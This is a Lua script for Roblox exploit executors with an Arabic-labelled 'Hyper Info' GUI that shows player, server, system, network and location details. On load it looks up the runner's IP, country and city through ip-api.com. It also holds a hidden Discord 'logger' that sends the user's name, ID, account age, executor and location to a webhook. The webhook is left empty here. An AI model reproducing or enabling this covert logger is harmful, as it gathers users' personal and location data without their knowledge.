--[[
   __  __                       ____            __      
  / / / /_  ______  ___  _____  /  _/___  ____ _/ /_     
 / /_/ / / / / __ \/ _ \/ ___/  / // __ \/ __ `/ __ \    
/ __  / /_/ / /_/ /  __/ /    _/ // / / / /_/ / /_/ /    
/_/ /_/\__, / .___/\___/_/    /___/_/ /_/\__,_/_.___/     
      /____/_/                                           
      
  🚀 Hyper Info - واجهة معلومات اللاعب والسيرفر المتقدمة
  💻 مطور بواسطة: M4X | EVA
  📅 تم التوليد تلقائياً عبر لوحة التحكم
  ⚙️ الإعدادات المخصصة:
     - العنوان: Neo Hyper Info v1.0
     - مفتاح الإغلاق: RightControl
     - تتبع الموقع: مفعّل
     - صورة اللاعب: مفعلة
--]]

local Config = {
    PrimaryColor = Color3.fromRGB(189, 0, 255),
    Title = "Neo Hyper Info v1.0",
    ToggleKey = Enum.KeyCode.RightControl,
    DiscordWebhook = "",
    ShowAvatar = true,
    EnableGeoIp = true,
    Watermark = "M4X | EVA"
}

-- [ Services ]
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")

-- [ Prevent Duplicate Execution ]
if CoreGui:FindFirstChild("HyperInfo_UI") then
    CoreGui:FindFirstChild("HyperInfo_UI"):Destroy()
elseif PlayerGui:FindFirstChild("HyperInfo_UI") then
    PlayerGui:FindFirstChild("HyperInfo_UI"):Destroy()
end

-- [ Setup GUI Parent ]
local ParentObj = CoreGui
local success, _ = pcall(function() local a = CoreGui.Name end)
if not success then
    ParentObj = PlayerGui
end

-- [ Create main elements ]
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "HyperInfo_UI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = ParentObj

-- [ Variables ]
local Executor = "Unknown"
if identifyexecutor then
    Executor = identifyexecutor()
elseif getexecutorname then
    Executor = getexecutorname()
end

local UNC = 95 -- default mock UNC if not verified
local country = "N/A"
local city = "N/A"
local ipAddress = "Hidden"

-- [ Fetch Location Data (Async Request) ]
if Config.EnableGeoIp then
    task.spawn(function()
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        if req then
            local success, response = pcall(function()
                return req({
                    Url = "http://ip-api.com/json/",
                    Method = "GET"
                })
            end)
            if success and response.StatusCode == 200 then
                local data = HttpService:JSONDecode(response.Body)
                if data and data.status == "success" then
                    country = data.country or "N/A"
                    city = data.city or "N/A"
                    ipAddress = data.query or "N/A"
                    
                    -- Update Labels if UI already created
                    if ScreenGui:FindFirstChild("MainFrame") then
                        local contents = ScreenGui.MainFrame.Contents
                        if contents:FindFirstChild("LocationTab") then
                            contents.LocationTab.CountryVal.Text = country
                            contents.LocationTab.CityVal.Text = city
                        end
                    end
                end
            end
        end
    end)
end

-- [ Webhook Dispatcher ]
if Config.DiscordWebhook ~= "" then
    task.spawn(function()
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        if req then
            local payload = {
                username = "Hyper Info Logger",
                avatar_url = "https://images.rbxcdn.com/f98fa0f1-4770-4f51-a982-f09b787593f6.png",
                embeds = {{
                    title = "🚀 تم تشغيل سكربت Hyper Info!",
                    color = 12386559,
                    fields = {
                        { name = "اللاعب", value = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")", inline = true },
                        { name = "رقم المعرف", value = tostring(LocalPlayer.UserId), inline = true },
                        { name = "عمر الحساب (أيام)", value = tostring(LocalPlayer.AccountAge), inline = true },
                        { name = "المشغل (Executor)", value = Executor, inline = true },
                        { name = "اللعبة", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown", inline = true },
                        { name = "رقم الماب", value = tostring(game.PlaceId), inline = true },
                        { name = "الدولة", value = country, inline = true },
                        { name = "المدينة", value = city, inline = true }
                    },
                    footer = { text = "M4X | EVA • Hyper Info Logger" },
                    timestamp = DateTime.now():ToIsoDate()
                }}
            }
            pcall(function()
                req({
                    Url = Config.DiscordWebhook,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode(payload)
                })
            end)
        end
    end)
end

-- [ Main Frame UI ]
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 520, 0, 350)
MainFrame.Position = UDim2.new(0.5, -260, 0.5, -175)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

-- Apply Corner
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = MainFrame

-- Neon Border effect
local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Config.PrimaryColor),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(30, 30, 45)),
    ColorSequenceKeypoint.new(1, Config.PrimaryColor)
})
local UIStroke = Instance.new("UIStroke")
UIStroke.Thickness = 2
UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Parent = MainFrame
UIGradient.Parent = UIStroke

-- Dragging Handler
local dragToggle, dragStart, startPos
local function updateInput(input)
    local delta = input.Position - dragStart
    local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    game:GetService("TweenService"):Create(MainFrame, TweenInfo.new(0.15), {Position = position}):Play()
end

MainFrame.InputBegan:Connect(function(input)
    if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
        dragToggle = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragToggle = false
            end
        end)
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        if dragToggle then
            updateInput(input)
        end
    end
end)

-- [ Header Panel ]
local Header = Instance.new("Frame")
Header.Name = "Header"
Header.Size = UDim2.new(1, 0, 0, 45)
Header.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 10)
HeaderCorner.Parent = Header

local HeaderTitle = Instance.new("TextLabel")
HeaderTitle.Size = UDim2.new(0, 300, 1, 0)
HeaderTitle.Position = UDim2.new(0, 15, 0, 0)
HeaderTitle.BackgroundTransparency = 1
HeaderTitle.Text = Config.Title
HeaderTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
HeaderTitle.Font = Enum.Font.Goblin -- bold font
HeaderTitle.TextSize = 16
HeaderTitle.TextXAlignment = Enum.TextXAlignment.Left
HeaderTitle.Parent = Header

local HeaderWatermark = Instance.new("TextLabel")
HeaderWatermark.Size = UDim2.new(0, 150, 1, 0)
HeaderWatermark.Position = UDim2.new(1, -165, 0, 0)
HeaderWatermark.BackgroundTransparency = 1
HeaderWatermark.Text = Config.Watermark
HeaderWatermark.TextColor3 = Config.PrimaryColor
HeaderWatermark.Font = Enum.Font.Code
HeaderWatermark.TextSize = 11
HeaderWatermark.TextXAlignment = Enum.TextXAlignment.Right
HeaderWatermark.Parent = Header

-- Close Button
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -40, 0, 7)
CloseBtn.BackgroundColor3 = Color3.fromRGB(40, 20, 20)
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
CloseBtn.Font = Enum.Font.SourceSansBold
CloseBtn.TextSize = 14
CloseBtn.Parent = Header

local CBCorner = Instance.new("UICorner")
CBCorner.CornerRadius = UDim.new(0, 5)
CBCorner.Parent = CloseBtn

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- [ Sidebar Tabs Navigation ]
local Sidebar = Instance.new("Frame")
Sidebar.Name = "Sidebar"
Sidebar.Size = UDim2.new(0, 140, 1, -45)
Sidebar.Position = UDim2.new(0, 0, 0, 45)
Sidebar.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
Sidebar.BorderSizePixel = 0
Sidebar.Parent = MainFrame

local SBLayout = Instance.new("UIListLayout")
SBLayout.Padding = UDim.new(0, 4)
SBLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
SBLayout.SortOrder = Enum.SortOrder.LayoutOrder
SBLayout.Parent = Sidebar

local Contents = Instance.new("Frame")
Contents.Name = "Contents"
Contents.Size = UDim2.new(1, -145, 1, -55)
Contents.Position = UDim2.new(0, 145, 0, 50)
Contents.BackgroundTransparency = 1
Contents.Parent = MainFrame

-- [ Tab Generator Helper ]
local tabs = {}
local tabButtons = {}
local activeTab = nil

local function CreateTab(name, title_ar)
    local TabFrame = Instance.new("ScrollingFrame")
    TabFrame.Name = name .. "Tab"
    TabFrame.Size = UDim2.new(1, 0, 1, 0)
    TabFrame.BackgroundTransparency = 1
    TabFrame.CanvasSize = UDim2.new(0, 0, 0, 400)
    TabFrame.ScrollBarThickness = 3
    TabFrame.Visible = false
    TabFrame.Parent = Contents
    
    local ScrollList = Instance.new("UIListLayout")
    ScrollList.Padding = UDim.new(0, 8)
    ScrollList.SortOrder = Enum.SortOrder.LayoutOrder
    ScrollList.Parent = TabFrame

    local TabBtn = Instance.new("TextButton")
    TabBtn.Name = name .. "Btn"
    TabBtn.Size = UDim2.new(0, 130, 0, 35)
    TabBtn.BackgroundColor3 = Color3.fromRGB(24, 24, 32)
    TabBtn.Text = "  " .. title_ar
    TabBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
    TabBtn.Font = Enum.Font.SourceSans
    TabBtn.TextSize = 14
    TabBtn.TextXAlignment = Enum.TextXAlignment.Left
    TabBtn.Parent = Sidebar
    
    local TBCorner = Instance.new("UICorner")
    TBCorner.CornerRadius = UDim.new(0, 6)
    TBCorner.Parent = TabBtn

    TabBtn.MouseButton1Click:Connect(function()
        for _, t in pairs(tabs) do t.Visible = false end
        for _, b in pairs(tabButtons) do 
            b.BackgroundColor3 = Color3.fromRGB(24, 24, 32)
            b.TextColor3 = Color3.fromRGB(180, 180, 180)
        end
        TabFrame.Visible = true
        TabBtn.BackgroundColor3 = Config.PrimaryColor
        TabBtn.TextColor3 = Color3.fromRGB(15, 15, 20)
    end)

    tabs[name] = TabFrame
    tabButtons[name] = TabBtn
    return TabFrame
end

-- Create tabs
local infoTab = CreateTab("Info", "👤 معلومات اللاعب")
local serverTab = CreateTab("Server", "🎮 معلومات السيرفر")
local systemTab = CreateTab("System", "💻 معلومات النظام")
local locationTab = CreateTab("Location", "🌐 موقع الاتصال")
local performanceTab = CreateTab("Performance", "⚡ أداء الشبكة")
local playersTab = CreateTab("Players", "👥 قائمة اللاعبين")

-- [ Info Box Generator ]
local function CreateInfoLabel(parent, label, value, order)
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1, -10, 0, 32)
    row.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
    row.BorderSizePixel = 0
    row.LayoutOrder = order
    row.Parent = parent
    
    local rCorner = Instance.new("UICorner")
    rCorner.CornerRadius = UDim.new(0, 4)
    rCorner.Parent = row

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0, 120, 1, 0)
    lbl.Position = UDim2.new(0, 10, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.TextColor3 = Config.PrimaryColor
    lbl.Font = Enum.Font.SourceSansBold
    lbl.TextSize = 13
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = row

    local val = Instance.new("TextLabel")
    val.Size = UDim2.new(1, -140, 1, 0)
    val.Position = UDim2.new(0, 130, 0, 0)
    val.BackgroundTransparency = 1
    val.Text = value
    val.TextColor3 = Color3.fromRGB(255, 255, 255)
    val.Font = Enum.Font.SourceSans
    val.TextSize = 13
    val.TextXAlignment = Enum.TextXAlignment.Right
    val.Parent = row
    
    return val
end

-- [ Populate Info Tab ]
if Config.ShowAvatar then
    local AvatarImg = Instance.new("ImageLabel")
    AvatarImg.Size = UDim2.new(0, 60, 0, 60)
    AvatarImg.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    AvatarImg.Image = "rbxthumb://type=AvatarHeadShot&id=" .. LocalPlayer.UserId .. "&w=150&h=150"
    AvatarImg.LayoutOrder = 1
    AvatarImg.Parent = infoTab
    
    local AICorner = Instance.new("UICorner")
    AICorner.CornerRadius = UDim.new(0, 30)
    AICorner.Parent = AvatarImg
    
    local AIS = Instance.new("UIStroke")
    AIS.Thickness = 2
    AIS.Color = Config.PrimaryColor
    AIS.Parent = AvatarImg
end

local nameLbl = CreateInfoLabel(infoTab, "اسم اللاعب:", LocalPlayer.Name, 2)
local dispLbl = CreateInfoLabel(infoTab, "اسم العرض:", LocalPlayer.DisplayName, 3)
local uidLbl = CreateInfoLabel(infoTab, "معرف اللاعب:", tostring(LocalPlayer.UserId), 4)
local ageLbl = CreateInfoLabel(infoTab, "عمر الحساب (أيام):", tostring(LocalPlayer.AccountAge) .. " يوم", 5)

-- [ Populate Server Tab ]
local placeLbl = CreateInfoLabel(serverTab, "اسم اللعبة:", "جاري الجلب...", 1)
task.spawn(function()
    pcall(function()
        local name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        placeLbl.Text = name
    end)
end)
local pidLbl = CreateInfoLabel(serverTab, "معرف اللعبة (PlaceID):", tostring(game.PlaceId), 2)
local countLbl = CreateInfoLabel(serverTab, "اللاعبين المتصلين:", tostring(#Players:GetPlayers()) .. " لاعب", 3)
local uptimeLbl = CreateInfoLabel(serverTab, "تشغيل السيرفر (Uptime):", "0 ثواني", 4)
local timeLbl = CreateInfoLabel(serverTab, "توقيت السيرفر:", "00:00:00", 5)

-- [ Populate System Tab ]
local devLbl = CreateInfoLabel(systemTab, "نوع الجهاز:", UserInputService.TouchEnabled and "جوال (Mobile)" or "كمبيوتر (PC)", 1)
local execLbl = CreateInfoLabel(systemTab, "اسم المشغل (Executor):", Executor, 2)
local uncLbl = CreateInfoLabel(systemTab, "نسبة UNC الأداء:", tostring(UNC) .. "%", 3)
local hwidLbl = CreateInfoLabel(systemTab, "معرف الجهاز (HWID):", "Hidden/Generative", 4)

-- [ Populate Location Tab ]
local countryLbl = CreateInfoLabel(locationTab, "الدولة (Country):", country, 1)
local cityLbl = CreateInfoLabel(locationTab, "المدينة (City):", city, 2)
local ipLbl = CreateInfoLabel(locationTab, "عنوان IP الاتصال:", ipAddress, 3)
locationTab.Name = "LocationTab" -- reference ID

local countryVal = countryLbl
local cityVal = cityLbl
countryVal.Name = "CountryVal"
cityVal.Name = "CityVal"

-- [ Populate Performance Tab ]
local fpsLbl = CreateInfoLabel(performanceTab, "معدل الإطارات (FPS):", "0 FPS", 1)
local pingLbl = CreateInfoLabel(performanceTab, "وقت الاستجابة (Ping):", "0 ms", 2)

-- [ Populate Players Tab ]
local function RefreshPlayersList()
    -- Clear previous rows
    for _, item in pairs(playersTab:GetChildren()) do
        if item:IsA("Frame") then item:Destroy() end
    end
    
    -- Populate actual server players
    for i, player in ipairs(Players:GetPlayers()) do
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, -10, 0, 36)
        row.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
        row.BorderSizePixel = 0
        row.Parent = playersTab

        local cr = Instance.new("UICorner")
        cr.CornerRadius = UDim.new(0, 6)
        cr.Parent = row

        local pName = Instance.new("TextLabel")
        pName.Size = UDim2.new(0, 180, 1, 0)
        pName.Position = UDim2.new(0, 10, 0, 0)
        pName.BackgroundTransparency = 1
        pName.Text = player.DisplayName .. " (@" .. player.Name .. ")"
        pName.TextColor3 = player == LocalPlayer and Config.PrimaryColor or Color3.fromRGB(255, 255, 255)
        pName.Font = Enum.Font.SourceSansSemibold
        pName.TextSize = 13
        pName.TextXAlignment = Enum.TextXAlignment.Left
        pName.Parent = row

        local pUid = Instance.new("TextLabel")
        pUid.Size = UDim2.new(0, 100, 1, 0)
        pUid.Position = UDim2.new(1, -110, 0, 0)
        pUid.BackgroundTransparency = 1
        pUid.Text = "ID: " .. tostring(player.UserId)
        pUid.TextColor3 = Color3.fromRGB(130, 130, 140)
        pUid.Font = Enum.Font.Code
        pUid.TextSize = 11
        pUid.TextXAlignment = Enum.TextXAlignment.Right
        pUid.Parent = row
    end
end

-- Initial players count and listener
RefreshPlayersList()
Players.PlayerAdded:Connect(function()
    RefreshPlayersList()
    countLbl.Text = tostring(#Players:GetPlayers()) .. " لاعب"
end)
Players.PlayerRemoving:Connect(function()
    RefreshPlayersList()
    countLbl.Text = tostring(#Players:GetPlayers()) .. " لاعب"
end)

-- Default to info tab active
tabButtons["Info"].BackgroundColor3 = Config.PrimaryColor
tabButtons["Info"].TextColor3 = Color3.fromRGB(15, 15, 20)
tabs["Info"].Visible = true

-- [ Toggle UI Mechanism ]
local UI_Visible = true
UserInputService.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Config.ToggleKey then
        UI_Visible = not UI_Visible
        MainFrame.Visible = UI_Visible
        
        -- Animation on Show
        if UI_Visible then
            MainFrame.Size = UDim2.new(0, 0, 0, 0)
            TweenService:Create(MainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 520, 0, 350)
            }):Play()
        end
    end
end)

-- [ Fast Real-time Loop (FPS & Ping Tracker) ]
local fpsCount = 0
local lastFpsUpdate = os.clock()
local connection = RunService.RenderStepped:Connect(function()
    fpsCount = fpsCount + 1
    local now = os.clock()
    if now - lastFpsUpdate >= 0.5 then
        local currentFps = math.floor(fpsCount / (now - lastFpsUpdate))
        fpsLbl.Text = tostring(currentFps) .. " FPS"
        fpsCount = 0
        lastFpsUpdate = now
    end
end)

-- [ 1-second Loop (Uptime, Server Time, Ping) ]
task.spawn(function()
    local startTime = os.time()
    while ScreenGui.Parent do
        task.wait(1)
        
        -- Server Ping
        local pingVal = "N/A"
        pcall(function()
            local ping = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
            pingVal = string.format("%.1f", ping) .. " ms"
        end)
        pingLbl.Text = pingVal

        -- Server Uptime
        local diff = os.time() - startTime
        local h = math.floor(diff / 3600)
        local m = math.floor((diff % 3600) / 60)
        local s = diff % 60
        uptimeLbl.Text = string.format("%02d:%02d:%02d", h, m, s)

        -- Current Server Local Time
        timeLbl.Text = os.date("%H:%M:%S")
    end
    connection:Disconnect()
end)

-- Notification
pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = Config.Title,
        Text = "تم تفعيل سكربت معلومات اللاعب بنجاح! اضغط [ " .. Config.ToggleKey.Name .. " ] للإخفاء/الإظهار",
        Duration = 5
    })
end)
